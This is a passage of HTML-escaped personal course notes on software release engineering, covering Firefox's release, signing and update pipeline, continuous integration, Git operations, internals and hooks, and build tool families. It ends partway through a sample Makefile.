        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Go to every team meeting&lt;/li&gt;
&lt;li&gt;Point of communications between all the teams between the releases&lt;/li&gt;
&lt;li&gt;Balance the stuff&lt;/li&gt;
&lt;li&gt;Go to build email that they send (build number, code for the build, urgency for the build). Routine vs. chem spill&lt;/li&gt;
&lt;li&gt;Also sends stop emails&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;reproducability&#34; &gt;Reproducability
&lt;span&gt;
    &lt;a href=&#34;#reproducability&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Tagging tool and versions&lt;/li&gt;
&lt;li&gt;Use script for matching it&lt;/li&gt;
&lt;li&gt;VCS repositories are used in the build&lt;/li&gt;
&lt;li&gt;In case of error&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;localization-of-the-build&#34; &gt;Localization of the build
&lt;span&gt;
    &lt;a href=&#34;#localization-of-the-build&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Unpacks build, repacks for the locale needed&lt;/li&gt;
&lt;li&gt;So many countries, concurrency is used&lt;/li&gt;
&lt;li&gt;Partner repacks, custom builds for various partners for custom bookmarks&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;signing&#34; &gt;Signing
&lt;span&gt;
    &lt;a href=&#34;#signing&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;To ensure the copy of firefox is authentic from Mozilla, signing is used&lt;/li&gt;
&lt;li&gt;Two types:  MIcrosoft Authenticode for exe and dll&amp;rsquo;s. Vs. GPG&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;26-updates&#34; &gt;2.6 Updates
&lt;span&gt;
    &lt;a href=&#34;#26-updates&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Built-in updater preferred over downloading and running standalone installer&lt;/li&gt;
&lt;li&gt;Downloading update package occurs in the background&lt;/li&gt;
&lt;li&gt;Prompt to update &amp;amp; restart after download&lt;/li&gt;
&lt;li&gt;Catch: generating updates from all &lt;strong&gt;supported&lt;/strong&gt; previous releases to the latest.
&lt;ul&gt;
&lt;li&gt;For every platform (Windows, Linux distros, macOS), every locale, every installer from LATEST-1, LATEST-2, LATEST-3. Not just for firefox&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Updates are snippets (XML) that point to the partial/complete .mar (Mozilla Archive) file&lt;/li&gt;
&lt;li&gt;Minor updates: Updating 3.6.* to the latest 3.6.*, beta → latest beta, nightly → latest nightly&lt;/li&gt;
&lt;li&gt;Major updates: advertisement of new features&lt;/li&gt;
&lt;li&gt;Complete vs partial updates. Partial is the binary diff between the old release complete .mar file and the latest release complete .mar file.&lt;/li&gt;
&lt;li&gt;These differences were shown to be very common across the platforms, so caching/hashing was used.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;release-pipeline-steps&#34; &gt;Release Pipeline Steps
&lt;span&gt;
    &lt;a href=&#34;#release-pipeline-steps&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Today we have rapid release cycles
&lt;ul&gt;
&lt;li&gt;Step 1: Configuration&lt;/li&gt;
&lt;li&gt;Step 2: Construction&lt;/li&gt;
&lt;li&gt;Step 3: Certification&lt;/li&gt;
&lt;li&gt;Step 4: Packaging&lt;/li&gt;
&lt;li&gt;Step 5: Deployment&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Monitor
&lt;ul&gt;
&lt;li&gt;Stuff&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;what-is-continuous-integration&#34; &gt;What is Continuous Integration
&lt;span&gt;
    &lt;a href=&#34;#what-is-continuous-integration&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;checks: does the commit actually integrate into the codebase&lt;/li&gt;
&lt;li&gt;how? build, test and report result&lt;/li&gt;
&lt;li&gt;why? Context switching costs exist so we need to test and address issues as soon as commits are made and not as long as possible&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;version-control-system&#34; &gt;Version Control System
&lt;span&gt;
    &lt;a href=&#34;#version-control-system&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;vcs-brief&#34; &gt;VCS Brief
&lt;span&gt;
    &lt;a href=&#34;#vcs-brief&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Enforce discipline&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Archiving versions&lt;/strong&gt; of source code&lt;/li&gt;
&lt;li&gt;Maintaining &lt;strong&gt;historical information&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Enable &lt;strong&gt;collaboration&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Recovery&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Conserve disk space&lt;/strong&gt; since only one central point and VCS uses compression&lt;/li&gt;
&lt;li&gt;Git is a distributed version control system&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;git-operations&#34; &gt;Git Operations
&lt;span&gt;
    &lt;a href=&#34;#git-operations&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;git clone&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;Online repo → Local repo&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Local
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;git log&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;git branch&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;git tag&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;merging a branch that points to an older commit
&lt;ul&gt;
&lt;li&gt;messes up the log because commits will have multiple parents&lt;/li&gt;
&lt;li&gt;could cause conflicts in the default branch&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;solution: git rebase
&lt;ul&gt;
&lt;li&gt;want to move the head to the latest of a branch&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;git diff [&amp;ndash;staged]&lt;/li&gt;
&lt;li&gt;git add FILE
&lt;ul&gt;
&lt;li&gt;git reset FILE to remove changes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;git bare repository server
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;git init --bare&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;git-database&#34; &gt;Git Database
&lt;span&gt;
    &lt;a href=&#34;#git-database&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;objects
&lt;ul&gt;
&lt;li&gt;Blob
&lt;ul&gt;
&lt;li&gt;A file being tracked by git&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tree
&lt;ul&gt;
&lt;li&gt;A directory tracked by git&lt;/li&gt;
&lt;li&gt;Contains a list of blob and trees&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Commit
&lt;ul&gt;
&lt;li&gt;A reference to a state being tracked by Git
&lt;ul&gt;
&lt;li&gt;Refers to a tree object&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;refs
&lt;ul&gt;
&lt;li&gt;heads
&lt;ul&gt;
&lt;li&gt;what commit each branch points to&lt;/li&gt;
&lt;li&gt;HEAD
&lt;ul&gt;
&lt;li&gt;A reference to the current branch that is checked out&lt;/li&gt;
&lt;li&gt;May refer to a commit if we are in a detached HEAD state&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;remotes
&lt;ul&gt;
&lt;li&gt;branches that are being tracked&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;tags
&lt;ul&gt;
&lt;li&gt;what commit each tag corresponds to&lt;/li&gt;
&lt;li&gt;tags are IMMUTABLE&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git cat-file -t COMMIT
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git cat-file -p COMMIT
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Can then find the blob we are looking for.&lt;/p&gt;
&lt;h3 id=&#34;git-hooks&#34; &gt;Git Hooks
&lt;span&gt;
    &lt;a href=&#34;#git-hooks&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Script to run when particular events occur on client or server side&lt;/li&gt;
&lt;li&gt;chmod u+x ./.git/hooks/commit-msg.sample&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;#!/bin/bash&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;#!/usr/bin/env node&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Problems
&lt;ul&gt;
&lt;li&gt;not everyone will enable it&lt;/li&gt;
&lt;li&gt;bad actors can turn off client-side hooks&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Solution: &lt;a href=&#34;https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks#_server_side_hooks&#34;&gt;server-side hooks&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Hook name&lt;/th&gt;
          &lt;th&gt;Description&lt;/th&gt;
          &lt;th&gt;Args&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;pre-receive&lt;/td&gt;
          &lt;td&gt;First script to run after a push from a client. Args are a list of references that are being pushed from &lt;strong&gt;stdin&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;NONE&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;update&lt;/td&gt;
          &lt;td&gt;Run once for each branch that was updated.&lt;/td&gt;
          &lt;td&gt;BRANCH_NAME BRANCH_SHA-1_OLD BRANCH_SHA-1_NEW. Rejects only per branch.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;post-receive&lt;/td&gt;
          &lt;td&gt;Runs after update completion, can be used to broadcast or create a new change&lt;/td&gt;
          &lt;td&gt;???&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;build-system&#34; &gt;Build System
&lt;span&gt;
    &lt;a href=&#34;#build-system&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Source code is an array of car parts and we want to deliver the final car&lt;/li&gt;
&lt;li&gt;A build system assembles the parts into deliverables efficiently without needing to remember certain actions&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;families-of-build-tools&#34; &gt;Families of Build Tools
&lt;span&gt;
    &lt;a href=&#34;#families-of-build-tools&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://learn.uwaterloo.ca/d2l/le/content/1005130/viewContent/5356971/View&#34;&gt;slides&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;low-level tools: define deps and rules for each input and output file&lt;/li&gt;
&lt;li&gt;abstraction-based tools: derive low-level build code from high-evel data. e.g., maps of sources files to executables&lt;/li&gt;
&lt;li&gt;framework-driven tools: default behaviour is assumed unless explicitly overridden&lt;/li&gt;
&lt;li&gt;organizationally-scaling tools: reuse the output of build command across machines to accelerate builds and reduce (organizational-level) waste
&lt;ul&gt;
&lt;li&gt;how do we do this for rust?&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dependency management tools&lt;/li&gt;
&lt;li&gt;Testing frameworks (CS 447)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;https://is.gd/rzymTT&#34;&gt;A Large-Scale Empirical Study of the Relationship between Build Technology and Build Maintenance&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;modern, framework-driven build technologies need to be maintained more often and these build changes are more tightly coupled with the source code than low-level or abstraction-based ones. However, build technology migrations tend to coincide with a shift of build maintenance work to a build-focused team, deferring the cost of build maintenance to them.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;low-level-build-systems&#34; &gt;Low-level Build Systems
&lt;span&gt;
    &lt;a href=&#34;#low-level-build-systems&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;make&#34; &gt;Make
&lt;span&gt;
    &lt;a href=&#34;#make&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;details&gt;&lt;summary&gt;Example File&lt;/summary&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-make&#34; data-lang=&#34;make&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# o files are built automatically via `$(CC) $(CPPFLAGS) $(CFLAGS) -c`
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#40ffff&#34;&gt;EXEC&lt;/span&gt; = main
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#40ffff&#34;&gt;OBJS&lt;/span&gt; = random.o input.o main.o
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#40ffff&#34;&gt;DEPS&lt;/span&gt; = &lt;span style=&#34;color:#ed9d13&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#40ffff&#34;&gt;OBJS&lt;/span&gt;:.o=.d&lt;span style=&#34;color:#ed9d13&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# DEPS = $(patsubt %.o,%.d,$(OBJS))
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# CC = gcc
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# preprocessor flags
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#40ffff&#34;&gt;CPPFLAGS&lt;/span&gt; = -MMD
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# CFLAGS: compiler flags
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# since the target is the name of a direct object, the built-in rule applies
